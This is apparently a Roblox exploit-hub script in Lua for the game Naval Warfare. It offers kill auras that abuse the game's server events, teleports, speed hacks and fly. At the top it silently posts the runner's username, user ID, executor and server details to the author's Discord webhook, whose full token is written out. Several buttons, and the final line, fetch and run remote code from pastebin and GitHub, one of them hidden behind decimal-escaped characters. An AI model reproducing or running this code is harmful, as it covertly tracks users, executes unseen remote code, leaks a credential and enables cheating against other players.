local gameLink = "https://www.roblox.com/games/"..game.PlaceId.."/"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name..""
gameLink = string.gsub(gameLink, " ", "-")
 
if string.sub(gameLink, -1) == "-" then
    gameLink = string.sub(gameLink, 1, -2)
end
 
 
-- bro why u here 
--{https://www.roblox.com/games/]]..game.PlaceId..[[/]] ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name..[[?serverJobId=]]..game.JobId..[[  }--
local url =
   "https://discord.com/api/webhooks/1199578687163617290/FJXC6h72f8TiyyDTjB8xi7lkro19fZeYoUB8KoKZjv1xM-pjqIvGoI8wMT_Vx4tmppxO"
local data = {
   ["content"] = " ***Executon Logs***",
   ["embeds"] = {
       {
           ["title"] = [[Script Executed in:  ]]   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. [[   
With:  ]].. identifyexecutor() or [[Unknown]],
           ["description"] = [[By:
           Username: ]] ..game.Players.LocalPlayer.Name.. [[   
           UserID: ]]..game.Players.LocalPlayer.UserId..[[   
           Profile: https://www.roblox.com/users/]]..game.Players.LocalPlayer.UserId..[[/profile
 
           Game link:  ]]..gameLink..[[
 
            JobId :  ]] ..game.JobId.. [[   
            Game Id :  ]] ..game.PlaceId.. [[
 
 
           Join game:  ```lua
game:GetService('TeleportService'):TeleportToPlaceInstance(]]..game.PlaceId..[[, ']]..game.JobId..[[')```]],
           ["type"] = "rich",
           ["color"] = tonumber(0x3131da),
           ["image"] = { 
               ["url"] = ""
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
 
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)













local OrionLib = loadstring(game:HttpGet(("https://pastebin.com/raw/F3FTzkFc")))()
local Window = OrionLib:MakeWindow({Name = "Naval Warfare (2024)", HidePremium = false, SaveConfig = true, ConfigFolder = "Mobile_Hub"})


-- naval warfare
local Tab = Window:MakeTab({
	Name = "Combat",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})
 
 
 
local Section = Tab:AddSection({
	Name = "Must hold gun out for aura to work."
})
 
local Section = Tab:AddSection({
	Name = "Combat"
})
 
Tab:AddButton({
	Name = "Rifle kill aura",
	Callback = function()
while true do
		wait(0.3) -- don't change this
 
		-- finding the characters
		for i, v in pairs(game.Workspace:GetChildren()) do
			if v.Name ~= game.Players.LocalPlayer.Name then
				if v:FindFirstChild("Humanoid") then
 
					-- team check
					local victimplayers = game.Players:GetPlayerFromCharacter(v)
					if victimplayers.TeamColor ~= game.Players.LocalPlayer.TeamColor then
 
						-- killing everyone
						local Event = game:GetService("ReplicatedStorage").Event
						Event:FireServer(
							"shootRifle",
							"",
							{
								v.Head
							}
 
						)
						Event:FireServer(
							"shootRifle",
							"hit",
							{
								v.Humanoid
 
							}
 
						)
					end
				end
			end
		end
	end
end    
})
 
Tab:AddButton({
	Name = "RPG kill aura (rpg gamepass)",
	Callback = function()
local UserInputService = game:GetService("UserInputService")
local Mouse = game.Players.LocalPlayer:GetMouse()
 
-- Function to update the opposite team players
local function updateOppositeTeamPlayers()
    local localPlayer = game.Players.LocalPlayer
    local oppositeTeamPlayers = {}
 
    -- Assuming your game has two teams named "TeamA" and "TeamB"
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Team ~= localPlayer.Team then
            table.insert(oppositeTeamPlayers, player)
        end
    end
 
    return oppositeTeamPlayers
end
 
-- Find the initial opposite team players
local oppositeTeamPlayers = updateOppositeTeamPlayers()
 
getgenv().shouldShoot = true
while shouldShoot do
    -- Calculate distances to find the nearest player
    local localPlayer = game.Players.LocalPlayer
    local nearestPlayer = nil
    local nearestDistance = math.huge
 
    for _, player in ipairs(oppositeTeamPlayers) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local playerPosition = player.Character.HumanoidRootPart.Position
            local distance = (playerPosition - localPlayer.Character.HumanoidRootPart.Position).Magnitude
 
            if distance < nearestDistance and player.Character.Humanoid.Health > 0 then
                nearestPlayer = player
                nearestDistance = distance
            end
        end
    end
 
    if nearestPlayer then
        local targetPosition = nearestPlayer.Character.HumanoidRootPart.Position
 
        local args = {
            [1] = "fireRPG",
            [2] = {
                [1] = targetPosition
            }
        }
 
        game:GetService("ReplicatedStorage"):WaitForChild("Event"):FireServer(unpack(args))
    end
 
    -- Delay between each shot (you can adjust this value)
    wait(0.5)
end
 
-- Update opposite team players when a player joins or switches teams
game.Players.PlayerAdded:Connect(function(player)
    oppositeTeamPlayers = updateOppositeTeamPlayers()
end)
 
game.Players.PlayerRemoving:Connect(function(player)
    oppositeTeamPlayers = updateOppositeTeamPlayers()
end)
end    
})
 
local Section = Tab:AddSection({
	Name = "Fast shoot rifle"
})
 
Tab:AddButton({
	Name = "Shoot rifle fast (mobile only)",
	Callback = function()
local UserInputService = game:GetService("UserInputService")
local firing = false
 
UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        firing = true
        while firing do
            game:GetService("Players").LocalPlayer.Character["M1 Garand"]:Activate()
            wait()
        end
    end
end)
 
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        firing = false
    end
end)
end    
})


-- naval warfare
local Tab = Window:MakeTab({
	Name = "Anti-air",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})

Tab:AddParagraph("How to use","These scripts shoot airplanes within 2.4k studs. One's for white machine guns on islands, harbors, carriers, and battleships. The other's for the player-driven ship (no carriers, battleships, or submarines). It auto-shoots airplanes or nearby targets. Click 'Change Gun' to switch to the machine gun. The scripts aren't perfect but still get some planes down.")

Tab:AddButton({
	Name = "White machine guns",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/raimbowo1/naval/main/1shoot.lua.txt"))()end    
})

Tab:AddButton({
	Name = "Your boat machine guns",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/raimbowo1/naval/main/bom"))()end    
})




local Tab = Window:MakeTab({
	Name = "Teleport",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Islands"
})


 
Tab:AddButton({
	Name = "Teleport to island A",
	Callback = function()
local islandIdentifier = "A" -- Replace with the unique identifier of the desired island
 
-- Function to find the island based on the identifier
local function findIslandByIdentifier(identifier)
    local islands = workspace:GetChildren()
    for _, island in ipairs(islands) do
        if island.Name == "Island" and island:IsA("Model") and island.IslandCode.Value == identifier then
            return island
        end
    end
    return nil
end
 
-- Function to find the flag post within the island
local function findFlagPostOnIsland(island)
    local flagPost = island:FindFirstChild("Flag")
    if flagPost then
        local flag = flagPost:FindFirstChild("Post")
        if flag and flag:IsA("BasePart") then
            return flag
        end
    end
    return nil
end
 
-- Get the desired island by identifier
local island = findIslandByIdentifier(islandIdentifier)
 
-- Check if the island exists
if island then
    -- Find the flag post within the island
    local flagPost = findFlagPostOnIsland(island)
 
    -- Check if the flag post exists
    if flagPost then
        -- Teleport the character to the flag post's position
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = flagPost.CFrame
    else
        warn("The flag post does not exist on the specified island.")
    end
else
    warn("The specified island does not exist.")
end
end    
})
 
Tab:AddButton({
	Name = "Teleport to island B",
	Callback = function()
local islandIdentifier = "B" -- Replace with the unique identifier of the desired island
 
-- Function to find the island based on the identifier
local function findIslandByIdentifier(identifier)
    local islands = workspace:GetChildren()
    for _, island in ipairs(islands) do
        if island.Name == "Island" and island:IsA("Model") and island.IslandCode.Value == identifier then
            return island
        end
    end
    return nil
end
 
-- Function to find the flag post within the island
local function findFlagPostOnIsland(island)
    local flagPost = island:FindFirstChild("Flag")
    if flagPost then
        local flag = flagPost:FindFirstChild("Post")
        if flag and flag:IsA("BasePart") then
            return flag
        end
    end
    return nil
end
 
-- Get the desired island by identifier
local island = findIslandByIdentifier(islandIdentifier)
 
-- Check if the island exists
if island then
    -- Find the flag post within the island
    local flagPost = findFlagPostOnIsland(island)
 
    -- Check if the flag post exists
    if flagPost then
        -- Teleport the character to the flag post's position
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = flagPost.CFrame
    else
        warn("The flag post does not exist on the specified island.")
    end
else
    warn("The specified island does not exist.")
end
end 
})
 
Tab:AddButton({
	Name = "Teleport to island C",
	Callback = function()
local islandIdentifier = "C" -- Replace with the unique identifier of the desired island
 
-- Function to find the island based on the identifier
local function findIslandByIdentifier(identifier)
    local islands = workspace:GetChildren()
    for _, island in ipairs(islands) do
        if island.Name == "Island" and island:IsA("Model") and island.IslandCode.Value == identifier then
            return island
        end
    end
    return nil
end
 
-- Function to find the flag post within the island
local function findFlagPostOnIsland(island)
    local flagPost = island:FindFirstChild("Flag")
    if flagPost then
        local flag = flagPost:FindFirstChild("Post")
        if flag and flag:IsA("BasePart") then
            return flag
        end
    end
    return nil
end
 
-- Get the desired island by identifier
local island = findIslandByIdentifier(islandIdentifier)
 
-- Check if the island exists
if island then
    -- Find the flag post within the island
    local flagPost = findFlagPostOnIsland(island)
 
    -- Check if the flag post exists
    if flagPost then
        -- Teleport the character to the flag post's position
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = flagPost.CFrame
    else
        warn("The flag post does not exist on the specified island.")
    end
else
    warn("The specified island does not exist.")
end
end 
})
 
local Section = Tab:AddSection({
	Name = "Teleport to player"
})
 
local playerNames = {}
for _, player in ipairs(game.Players:GetPlayers()) do
    table.insert(playerNames, player.Name)
end
 
Tab:AddDropdown({
	Name = "Dropdown",
	Default = "Select Player",
	Options = playerNames,
	Callback = function(currentOption)
		selectedPlayer = currentOption
	end    
})
local function updateDropdown()
    playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    dropdown:Refresh(playerNames)
 
    -- If the selected player left the game, select the first player in the dropdown
    if not table.find(playerNames, selectedPlayer) then
        selectedPlayer = playerNames[1]
        dropdown:SetOption(selectedPlayer)
    end
end
 
local teleportButton = Tab:AddButton({
	Name = "Teleport",
	Callback = function()
      		local selectedPlayerObject = game.Players:FindFirstChild(selectedPlayer)
    if selectedPlayerObject then
        local selectedPlayerCharacter = selectedPlayerObject.Character
        if selectedPlayerCharacter then
            local selectedPlayerRootPart = selectedPlayerCharacter:FindFirstChild("HumanoidRootPart")
            if selectedPlayerRootPart then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = selectedPlayerRootPart.CFrame
            end
        end
    end
  	end    
})
 
game.Players.PlayerAdded:Connect(function(player)
    updateDropdown()
end)
 
game.Players.PlayerRemoving:Connect(function(player)
    updateDropdown()
end)




local Tab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Player scripts"
})
 
Tab:AddButton({
	Name = "Mobile Fly",
	Callback = function()
      		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
  	end    
})
 
Tab:AddToggle({
	Name = "Respawn where died",
	Default = false,
	Callback = function(spawn)
		if spawn then 
		getgenv().re = true
 
while re do
    if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
        local pos = game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame
        wait(6.5)
        game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end
    wait()
end
    else
        getgenv().re = false
 
while re do
    if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
        local pos = game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame
        wait(6.5)
        game:GetService "Players".LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end
end
	end 
	end
})
 
Tab:AddTextbox({
	Name = "Walkspeed",
	Default = "16",
	TextDisappear = true,
	Callback = function(speed)
			while true do
        wait()
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = speed
        end
	end	  
})
 
Tab:AddTextbox({
	Name = "Jump power",
	Default = "50",
	TextDisappear = true,
	Callback = function(jumpp)
			while true do
        wait()
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpp
        end
	end	  
})
 

local Tab = Window:MakeTab({
	Name = "Other",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "Walk on water",
	Callback = function()
local baseplateSize = 2048 -- Adjust the size of each baseplate segment as desired
local cornerPositions = {
    Vector3.new(-5114, 1, -8188),
    Vector3.new(-5118, 0, 8188),
    Vector3.new(5119, 2, 8190),
    Vector3.new(5126, 6, -8199)
}
 
local minX = math.min(cornerPositions[1].X, cornerPositions[2].X, cornerPositions[3].X, cornerPositions[4].X)
local minZ = math.min(cornerPositions[1].Z, cornerPositions[2].Z, cornerPositions[3].Z, cornerPositions[4].Z)
 
local maxX = math.max(cornerPositions[1].X, cornerPositions[2].X, cornerPositions[3].X, cornerPositions[4].X)
local maxZ = math.max(cornerPositions[1].Z, cornerPositions[2].Z, cornerPositions[3].Z, cornerPositions[4].Z)
 
local baseplateCountX = math.ceil((maxX - minX) / baseplateSize)
local baseplateCountZ = math.ceil((maxZ - minZ) / baseplateSize)
 
local waterColor = Color3.fromRGB(128, 187, 219) -- Color of water
 
for x = 1, baseplateCountX do
    for z = 1, baseplateCountZ do
        local baseplate = Instance.new("Part")
        baseplate.Name = "Baseplate"
        baseplate.Anchored = true
        baseplate.Size = Vector3.new(baseplateSize, 1, baseplateSize)
        baseplate.BrickColor = BrickColor.new(waterColor)
        baseplate.Material = Enum.Material.Granite
        baseplate.CFrame = CFrame.new(
            minX + (x - 0.5) * baseplateSize,
            0,
            minZ + (z - 0.5) * baseplateSize
        )
        baseplate.Parent = workspace
    end
end
  	end    
})

Tab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end    
})


-- naval warfare
local Tab = Window:MakeTab({
	Name = "Credits/info",
	Icon = "rbxassetid://10891594364",
	PremiumOnly = false
})
 
local Section = Tab:AddSection({
	Name = "Made by n.oo.b - discord \n I've previously made another script which is located below.\n This is a minor update to that first script."
})

Tab:AddButton({
	Name = "Old script",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pdRtuZn7"))()end    
})

wait(0.1)
loadstring(game:HttpGet("https://pastebin.com/raw/WrtjphL1"))()
